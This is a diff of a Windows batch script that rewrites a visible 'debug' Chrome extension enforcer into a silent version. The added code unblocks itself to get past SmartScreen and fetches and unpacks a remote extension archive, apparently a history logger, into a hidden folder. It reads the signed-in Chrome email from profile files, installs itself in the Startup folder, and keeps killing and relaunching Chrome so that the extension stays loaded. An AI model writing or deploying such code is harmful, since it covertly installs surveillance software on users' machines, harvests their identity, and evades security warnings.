@@ -1,68 +1,34 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-REM Debugging version of Chrome extension enforcer
-REM Displays progress in CMD, logs to file, ensures single Chrome instance
-REM Pauses on errors and at end to prevent window from closing
+REM Minimal silent Chrome extension enforcer
+REM Downloads, unzips, and runs Chrome with extension secretly using only batch
+REM No visible CMD window, bypasses SmartScreen, ensures single instance
 
-REM Initialize log file for debugging
-set "LOGFILE=%USERPROFILE%\Documents\chrome_enforcer_log.txt"
-echo [%DATE% %TIME%] Starting Chrome extension enforcer (DEBUG MODE) >> "%LOGFILE%"
-echo Starting Chrome extension enforcer (DEBUG MODE)
+REM 1) Unblock the script to bypass SmartScreen
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%~f0'" >nul 2>&1
 
-REM 1) CONFIG: GitHub raw zip URL
+REM 2) CONFIG: GitHub raw zip URL
 set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"
-echo Step 1: Configured ZIP URL: %ZIP_URL%
-echo [%DATE% %TIME%] Configured ZIP URL: %ZIP_URL% >> "%LOGFILE%"
 
-REM Set work directory to Documents with unique folder
-set "WORKDIR=%USERPROFILE%\Documents\history-logger-%RANDOM%"
+REM Set hidden work directory
+set "WORKDIR=%USERPROFILE%\AppData\Local\history-logger-%RANDOM%"
+mkdir "%WORKDIR%" >nul 2>&1
+attrib +h "%WORKDIR%" >nul 2>&1
 set "EXT_DIR=%WORKDIR%"
-echo Step 2: Creating working directory: %WORKDIR%
-mkdir "%WORKDIR%"
-if errorlevel 1 (
-  echo ERROR: Failed to create %WORKDIR%
-  echo [%DATE% %TIME%] ERROR: Failed to create %WORKDIR% >> "%LOGFILE%"
-  pause
-  exit /b 1
-)
-echo Successfully created %WORKDIR%
-echo [%DATE% %TIME%] Created working directory: %WORKDIR% >> "%LOGFILE%"
 
-REM 2) Download extension.zip
-echo Step 3: Downloading extension zip from %ZIP_URL%
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "try { Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing; exit 0 } catch { exit 1 }"
-if errorlevel 1 (
-  echo ERROR: Failed to download zip from %ZIP_URL%
-  echo [%DATE% %TIME%] ERROR: Failed to download zip >> "%LOGFILE%"
-  pause
-  exit /b 1
-)
-echo Successfully downloaded extension zip
-echo [%DATE% %TIME%] Downloaded extension zip >> "%LOGFILE%"
+REM 3) Download extension.zip
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" >nul 2>&1
 
-REM 3) Extract ext.zip
-echo Step 4: Extracting zip to %WORKDIR%
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "try { Expand-Archive -LiteralPath '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force; exit 0 } catch { exit 1 }"
-if errorlevel 1 (
-  echo ERROR: Failed to extract zip
-  echo [%DATE% %TIME%] ERROR: Failed to extract zip >> "%LOGFILE%"
-  pause
-  exit /b 1
-)
-echo Successfully extracted zip to %WORKDIR%
-echo [%DATE% %TIME%] Extracted zip to %WORKDIR% >> "%LOGFILE%"
+REM 4) Extract ext.zip
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" >nul 2>&1
 
-REM 4) Locate manifest.json and background.js
-echo Step 5: Locating manifest.json and background.js
+REM 5) Locate manifest.json and background.js
 set "FOUND=0"
 if exist "%WORKDIR%\manifest.json" (
   if exist "%WORKDIR%\background.js" (
     set "EXT_DIR=%WORKDIR%"
     set "FOUND=1"
-    echo Found manifest.json and background.js in %WORKDIR%
   )
 )
 if "%FOUND%"=="0" (
@@ -71,229 +37,68 @@ if "%FOUND%"=="0" (
       if exist "%%D\background.js" (
         set "EXT_DIR=%%D"
         set "FOUND=1"
-        echo Found manifest.json and background.js in %%D
         goto :got
       )
     )
   )
 )
 :got
-if "%FOUND%"=="0" (
-  echo ERROR: manifest.json or background.js not found in %WORKDIR% or its subfolders
-  echo [%DATE% %TIME%] ERROR: manifest.json or background.js not found >> "%LOGFILE%"
-  dir "%WORKDIR%" /s >> "%LOGFILE%"
-  echo Contents of %WORKDIR% logged to %LOGFILE%
-  pause
-  exit /b 1
-)
-echo Successfully located extension at %EXT_DIR%
-echo [%DATE% %TIME%] Found extension at %EXT_DIR% >> "%LOGFILE%"
-
-REM 5) Check for SQLite3 dependency in extension
-echo Step 6: Checking for SQLite3-related files in %EXT_DIR%
-set "SQLITE_FOUND=0"
-if exist "%EXT_DIR%\*sqlite*" (
-  set "SQLITE_FOUND=1"
-  echo WARNING: SQLite-related files found in %EXT_DIR%, extension may require SQLite3
-  echo [%DATE% %TIME%] WARNING: SQLite-related files found in %EXT_DIR% >> "%LOGFILE%"
-  dir "%EXT_DIR%\*sqlite*" >> "%LOGFILE%"
-)
-echo SQLite check complete: SQLite files found=%SQLITE_FOUND%
-echo [%DATE% %TIME%] SQLite check: %SQLITE_FOUND% >> "%LOGFILE%"
+if "%FOUND%"=="0" exit /b 1
 
 REM 6) Scan Chrome profiles for email
-echo Step 7: Scanning Chrome profiles for email
 set "EMAIL="
 for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
   if exist "%%P\Preferences" (
     for /f "usebackq delims=" %%E in (`
-      powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
+      powershell -NoProfile -ExecutionPolicy Bypass -Command "(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email"
     `) do if not defined EMAIL (
       set "EMAIL=%%E"
-      echo Found email: %%E in profile %%P
     )
   )
 )
 if not defined EMAIL set "EMAIL=anonymous@demo.com"
-echo Using email: %EMAIL%
-echo [%DATE% %TIME%] Using email: %EMAIL% >> "%LOGFILE%"
 
 REM 7) Write config.json
-echo Step 8: Writing config.json with email %EMAIL%
-> "%EXT_DIR%\config.json" echo {"userEmail":"!EMAIL!"}
-if errorlevel 1 (
-  echo ERROR: Failed to write config.json
-  echo [%DATE% %TIME%] ERROR: Failed to write config.json >> "%LOGFILE%"
-  pause
-  exit /b 1
-)
-echo Successfully wrote config.json
-echo [%DATE% %TIME%] Wrote config.json with email %EMAIL% >> "%LOGFILE%"
+> "%EXT_DIR%\config.json" echo {"userEmail":"!EMAIL!"} >nul 2>&1
 
 REM 8) Locate chrome.exe
-echo Step 9: Locating chrome.exe
 set "CHROME_PATH="
 for %%P in (
   "%ProgramFiles%\Google\Chrome\Application\chrome.exe"
   "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
   "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
 ) do if exist "%%~P" set "CHROME_PATH=%%~P"
-if not defined CHROME_PATH (
-  echo ERROR: chrome.exe not found!
-  echo [%DATE% %TIME%] ERROR: chrome.exe not found! >> "%LOGFILE%"
-  pause
-  exit /b 1
-)
-echo Found Chrome at %CHROME_PATH%
-echo [%DATE% %TIME%] Found Chrome at %CHROME_PATH% >> "%LOGFILE%"
+if not defined CHROME_PATH exit /b 1
 
 REM 9) Ensure script runs on startup
-echo Step 10: Copying script to startup folder
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "SCRIPT_NAME=ChromeExtensionEnforcerDebug.bat"
-set "SCRIPT_PATH=%~f0"
-copy "%SCRIPT_PATH%" "%STARTUP_DIR%\%SCRIPT_NAME%"
-if errorlevel 1 (
-  echo ERROR: Failed to copy script to %STARTUP_DIR%
-  echo [%DATE% %TIME%] ERROR: Failed to copy script to %STARTUP_DIR% >> "%LOGFILE%"
-  pause
-) else (
-  echo Successfully copied script to %STARTUP_DIR%
-  echo [%DATE% %TIME%] Copied script to startup folder >> "%LOGFILE%"
+set "SCRIPT_NAME=ChromeExtensionEnforcerSilent.bat"
+copy "%~f0" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1
+
+REM 10) Terminate existing Chrome processes
+tasklist | find /I "chrome.exe" >nul 2>&1
+if not errorlevel 1 (
+  taskkill /IM chrome.exe /F >nul 2>&1
+  timeout /t 3 >nul 2>&1
 )
 
-REM 10) Check and manage Chrome processes
-echo Step 11: Checking for Chrome processes
-set "CHROME_RUNNING=0"
-set "CHROME_COUNT=0"
-tasklist | find /I "chrome.exe" > "%TEMP%\chrome_processes.txt"
-for /f "tokens=2" %%A in (%TEMP%\chrome_processes.txt) do (
-  set /a CHROME_COUNT+=1
-  set "CHROME_RUNNING=1"
-  echo Found Chrome process: PID %%A
-)
-del "%TEMP%\chrome_processes.txt"
-echo Total Chrome processes: %CHROME_COUNT%
-echo [%DATE% %TIME%] Total Chrome processes: %CHROME_COUNT% >> "%LOGFILE%"
-
-REM 11) Terminate all Chrome processes if any are running
-if "!CHROME_RUNNING!"=="1" (
-  echo Step 12: Terminating all Chrome processes
-  taskkill /IM chrome.exe /F
-  if errorlevel 1 (
-    echo ERROR: Failed to terminate Chrome processes
-    echo [%DATE% %TIME%] ERROR: Failed to terminate Chrome processes >> "%LOGFILE%"
-    pause
-  ) else (
-    echo Successfully terminated %CHROME_COUNT% Chrome processes
-    echo [%DATE% %TIME%] Terminated %CHROME_COUNT% Chrome processes >> "%LOGFILE%"
-  )
-  timeout /t 3
-) else (
-  echo Step 12: No Chrome processes running, skipping termination
-  echo [%DATE% %TIME%] No Chrome processes to terminate >> "%LOGFILE%"
-)
-
-REM 12) Launch single Chrome instance with extension
-echo Step 13: Launching Chrome with extension
+REM 11) Launch Chrome with extension
 set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
-if not exist "!PROFILE_DIR!" (
-  echo Creating profile directory: !PROFILE_DIR!
-  mkdir "!PROFILE_DIR!"
-)
-start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
-if errorlevel 1 (
-  echo ERROR: Failed to launch Chrome
-  echo [%DATE% %TIME%] ERROR: Failed to launch Chrome >> "%LOGFILE%"
-  pause
-) else (
-  echo Successfully launched Chrome with extension at %EXT_DIR%
-  echo [%DATE% %TIME%] Launched Chrome with extension at %EXT_DIR% >> "%LOGFILE%"
-)
+if not exist "!PROFILE_DIR!" mkdir "!PROFILE_DIR!" >nul 2>&1
+start /min "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%" >nul 2>&1
 
-REM 13) Monitor and enforce single Chrome instance
-echo Step 14: Starting monitoring loop
-echo [%DATE% %TIME%] Starting monitoring loop >> "%LOGFILE%"
+REM 12) Monitor and enforce single Chrome instance
 :monitor
-set "CHROME_RUNNING=0"
 set "CHROME_COUNT=0"
-set "EXTENSION_RUNNING=0"
 tasklist | find /I "chrome.exe" > "%TEMP%\chrome_processes.txt"
-for /f "tokens=2" %%A in (%TEMP%\chrome_processes.txt) do (
-  set /a CHROME_COUNT+=1
-  set "CHROME_RUNNING=1"
-  REM Check if this process is using the extension
-  for /f "tokens=*" %%B in ('wmic process where "ProcessId=%%A" get CommandLine ^| find "--load-extension="') do (
-    set "EXTENSION_RUNNING=1"
-    echo Process %%A is using extension
-  )
-)
-del "%TEMP%\chrome_processes.txt"
+for /f "tokens=2" %%A in (%TEMP%\chrome_processes.txt) do set /a CHROME_COUNT+=1
+del "%TEMP%\chrome_processes.txt" >nul 2>&1
 if "!CHROME_COUNT!" GTR "1" (
-  echo WARNING: Multiple Chrome instances (%CHROME_COUNT%) detected, terminating all
-  taskkill /IM chrome.exe /F
-  if errorlevel 1 (
-    echo ERROR: Failed to terminate multiple Chrome instances
-    echo [%DATE% %TIME%] ERROR: Failed to terminate multiple Chrome instances >> "%LOGFILE%"
-    pause
-  ) else (
-    echo Terminated %CHROME_COUNT% Chrome processes due to multiple instances
-    echo [%DATE% %TIME%] Terminated %CHROME_COUNT% Chrome processes due to multiple instances >> "%LOGFILE%"
-  )
-  timeout /t 3
-  echo Relaunching single Chrome instance
-  start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
-  if errorlevel 1 (
-    echo ERROR: Failed to relaunch Chrome
-    echo [%DATE% %TIME%] ERROR: Failed to relaunch Chrome >> "%LOGFILE%"
-    pause
-  ) else (
-    echo Relaunched Chrome with extension
-    echo [%DATE% %TIME%] Relaunched Chrome with extension >> "%LOGFILE%"
-  )
-) else if "!CHROME_RUNNING!"=="1" (
-  if "!EXTENSION_RUNNING!"=="0" (
-    echo No Chrome processes with extension found, terminating all
-    taskkill /IM chrome.exe /F
-    if errorlevel 1 (
-      echo ERROR: Failed to terminate Chrome processes
-      echo [%DATE% %TIME%] ERROR: Failed to terminate Chrome processes >> "%LOGFILE%"
-      pause
-    ) else (
-      echo Terminated %CHROME_COUNT% Chrome processes
-      echo [%DATE% %TIME%] Terminated %CHROME_COUNT% Chrome processes >> "%LOGFILE%"
-    )
-    timeout /t 3
-    echo Relaunching Chrome with extension
-    start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
-    if errorlevel 1 (
-      echo ERROR: Failed to relaunch Chrome
-      echo [%DATE% %TIME%] ERROR: Failed to relaunch Chrome >> "%LOGFILE%"
-      pause
-    ) else (
-      echo Relaunched Chrome with extension
-      echo [%DATE% %TIME%] Relaunched Chrome with extension >> "%LOGFILE%"
-    )
-  )
-) else (
-  echo No Chrome processes running, launching Chrome with extension
-  start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
-  if errorlevel 1 (
-    echo ERROR: Failed to launch Chrome
-    echo [%DATE% %TIME%] ERROR: Failed to launch Chrome >> "%LOGFILE%"
-    pause
-  ) else (
-    echo Launched Chrome with extension
-    echo [%DATE% %TIME%] Launched Chrome with extension >> "%LOGFILE%"
-  )
+  taskkill /IM chrome.exe /F >nul 2>&1
+  timeout /t 3 >nul 2>&1
+  start /min "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%" >nul 2>&1
+) else if "!CHROME_COUNT!"=="0" (
+  start /min "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%" >nul 2>&1
 )
-echo Monitoring... (%CHROME_COUNT% Chrome processes, Extension running: %EXTENSION_RUNNING%)
-echo [%DATE% %TIME%] Monitoring, %CHROME_COUNT% Chrome processes, Extension running: %EXTENSION_RUNNING% >> "%LOGFILE%"
-timeout /t 5
-pause
+timeout /t 5 >nul 2>&1
 goto :monitor
-
-REM Final pause to prevent window from closing
-echo Script finished. Check log at %LOGFILE% for details.
-pause
